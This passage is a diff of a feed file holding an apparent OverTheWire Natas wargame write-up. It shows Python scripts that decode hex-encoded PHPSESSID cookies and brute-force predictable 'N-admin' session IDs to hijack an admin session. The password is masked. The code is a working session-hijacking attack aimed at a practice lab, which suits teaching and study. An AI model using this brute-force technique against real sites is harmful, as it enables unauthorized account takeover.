 &lt;p&gt;This time we have no access to the source code to see how the session IDs are created. However, we have access to the values in the cookie which are created by the session.&lt;/p&gt;
 &lt;p&gt;We write the following snippet:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;HEADER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Cookie&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;PHPSESSID=&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;HEADER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;Cookie&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;PHPSESSID=&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;
 &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;PAYLOAD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;HEADER&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HEADER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
@@ -982,61 +980,61 @@ if($showform) {
 
 
 &lt;p&gt;This produces the following output:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0
-{&amp;#39;PHPSESSID&amp;#39;: &amp;#39;3236312d75736572&amp;#39;}
-1
-{&amp;#39;PHPSESSID&amp;#39;: &amp;#39;3136372d75736572&amp;#39;}
-2
-{&amp;#39;PHPSESSID&amp;#39;: &amp;#39;3534342d75736572&amp;#39;}
-3
-{&amp;#39;PHPSESSID&amp;#39;: &amp;#39;3238352d75736572&amp;#39;}
-4
-{&amp;#39;PHPSESSID&amp;#39;: &amp;#39;3334332d75736572&amp;#39;}
-(...)
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;PHPSESSID&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;3236312&lt;/span&gt;&lt;span class="n"&gt;d75736572&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;PHPSESSID&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;3136372&lt;/span&gt;&lt;span class="n"&gt;d75736572&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="mi"&gt;2&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;PHPSESSID&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;3534342&lt;/span&gt;&lt;span class="n"&gt;d75736572&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="mi"&gt;3&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;PHPSESSID&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;3238352&lt;/span&gt;&lt;span class="n"&gt;d75736572&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="mi"&gt;4&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;PHPSESSID&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;3334332&lt;/span&gt;&lt;span class="n"&gt;d75736572&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;(...)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;So the session ID is an hexadecimal number. Let's decode it:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;id_hex&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;utils&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dict_from_cookiejar&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;PHPSESSID&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
-&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;id_hex&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;id_hex&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;utils&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dict_from_cookiejar&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;PHPSESSID&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;id_hex&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Mmmm, interesting:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0
-548-user
-1
-275-user
-2
-237-user
-3
-90-user
-4
-535-user
-(...)
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
+&lt;span class="mi"&gt;548&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;
+&lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;span class="mi"&gt;275&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;
+&lt;span class="mi"&gt;2&lt;/span&gt;
+&lt;span class="mi"&gt;237&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;
+&lt;span class="mi"&gt;3&lt;/span&gt;
+&lt;span class="mi"&gt;90&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;
+&lt;span class="mi"&gt;4&lt;/span&gt;
+&lt;span class="mi"&gt;535&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;
+&lt;span class="p"&gt;(...)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The session ID is really a random number (below 640) attached to the given username. That's easy.&lt;/p&gt;
 &lt;h4&gt;Crafting the attack:&lt;/h4&gt;
 &lt;p&gt;We write the following script:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
 
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;brute_force_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PAYLOAD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;MAXID&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;MAXID&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-        &lt;span class="n"&gt;HEADER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Cookie&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;PHPSESSID=&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;-admin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;
+        &lt;span class="n"&gt;HEADER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;Cookie&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;PHPSESSID=&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;-admin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;
         &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;PAYLOAD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;HEADER&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
         &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;You are an admin&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;You are an admin&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
             &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
             &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 
-&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
 
-    &lt;span class="n"&gt;AUTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;natas19&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;***********************&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="n"&gt;URL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://natas19.natas.labs.overthewire.org/index.php?&amp;#39;&lt;/span&gt;
+    &lt;span class="n"&gt;AUTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;natas19&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;***********************&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;URL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;http://natas19.natas.labs.overthewire.org/index.php?&amp;#39;&lt;/span&gt;
 
-    &lt;span class="n"&gt;PAYLOAD&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
+    &lt;span class="n"&gt;PAYLOAD&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
     &lt;span class="n"&gt;MAXID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;640&lt;/span&gt;
 
     &lt;span class="n"&gt;brute_force_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PAYLOAD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;MAXID&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
@@ -1044,6 +1042,6 @@ if($showform) {
 
 
 &lt;p&gt;And we get our password in the 501th attempt. Awesome.&lt;/p&gt;
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;p&gt;That's it. The &lt;a href="https://github.com/bt3gl/CTFs-Gray-Hacker-and-PenTesting/tree/master/Web_Exploits"&gt;source code is available&lt;/a&gt; as usual.&lt;/p&gt;
-&lt;p&gt;Hack all the things!&lt;/p&gt;</content><category term="Wargames"></category><category term="Python"></category><category term="BurpSuite"></category><category term="request"></category><category term="PHP"></category><category term="JavaScript"></category><category term="SQLi"></category><category term="Command_Injection"></category><category term="MySQL"></category><category term="XOR"></category><category term="Brute_Force"></category></entry></feed>
+&lt;p&gt;Hack all the things!&lt;/p&gt;</summary><category term="Wargames"></category><category term="Python"></category><category term="BurpSuite"></category><category term="request"></category><category term="PHP"></category><category term="JavaScript"></category><category term="SQLi"></category><category term="Command_Injection"></category><category term="MySQL"></category><category term="XOR"></category><category term="Brute_Force"></category></entry></feed>
